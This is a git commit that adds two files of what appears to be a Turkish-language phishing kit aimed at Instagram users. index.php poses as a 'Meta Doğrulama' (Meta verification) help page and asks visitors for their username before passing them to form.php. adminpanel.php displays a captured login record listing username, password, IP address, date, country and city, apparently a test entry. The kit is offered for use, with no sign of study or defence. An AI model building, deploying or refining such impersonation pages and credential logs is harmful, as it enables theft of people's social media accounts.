5ee523296f6b0dd3c9d4e84bae5c8f9b40864a14
Sapphire1223 <59963002+Sapphire1223@users.noreply.github.com>
2022-07-11 23:41:44 +0300

    Add files via upload

---
+++ adminpanel.php
@@ -0,0 +1,50 @@
+
+<html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+</head>
+<body bgcolor='#0000a0'>
+<body bgcolor='rgb(0,0,0)'>
+<body bgcolor='darkblue'>
+
+
+<html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+</head>
+<body bgcolor='#0000a0'>
+<body bgcolor='rgb(0,0,0)'>
+<body bgcolor='darkblue'>
+
+
+<html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+</head>
+<body bgcolor='#0000a0'>
+<body bgcolor='rgb(0,0,0)'>
+<body bgcolor='darkblue'>
+
+
+
+<html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+</head>
+<body bgcolor='#0000a0'>
+<body bgcolor='rgb(0,0,0)'>
+<body bgcolor='darkblue'>
+
+<font color='red'>Kullanıcı Adı: </font><font color='white'>DEMİSE</font><br>
+<font color='red'> Şifre: </font><font color='white'>demise123</font><br>
+<font color='red'>Ip Adresi: </font><font color='white'>::1</font><br>
+<font color='red'>Tarih: </font><font color='white'>11-07-2022 20:28:14</font><br>
+<font color='red'>Ülke: </font><font color='white'></font><br>
+<font color='red'>Şehir: </font><font color='white'></font><br>
+<hr>
+
+
---
+++ index.php
@@ -0,0 +1,66 @@
+<?php
+error_reporting(0);
+?>
+
+<html>
+ <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="css/style.css" type="text/css" rel="stylesheet"/>
+    
+<title>Meta Doğrulama | Help Instagram</title>
+
+<link rel="icon" href="fav.webp">
+
+
+
+
+
+ </head>     
+   <body>
+     <body bgcolor="#fafafa">
+       <br>
+       <br>
+       <br>
+<center>
+
+<div class="form">
+<form method="get" action="form.php">
+
+<img src="image/giris.gif" width=179>
+
+<h2>Meta Doğrulama</h2>
+
+<p>
+Lütfen kullanıcı adınızı girin ve itiraz formuna geçmek için bir sonraki adıma geçin.
+</p>
+<br>
+ <input type="text" class="username" name=username placeholder="Kullanıcı Adı" required="1"aria-required="true">
+ <br>
+ <br>
+<button>Devam Et<tbutton>
+
+</form>
+</div>
+
+<br>
+<br>
+
+</div>
+
+</center>
+
+<center><br> <br>
+
+<div id="get">
+
+<img src="image/app.webp" width=120 >
+
+<img src="image/play.webp" width=120>
+
+</div>
+
+<br><br><br>
+
+
+<?php include 'footer.php'; ?>
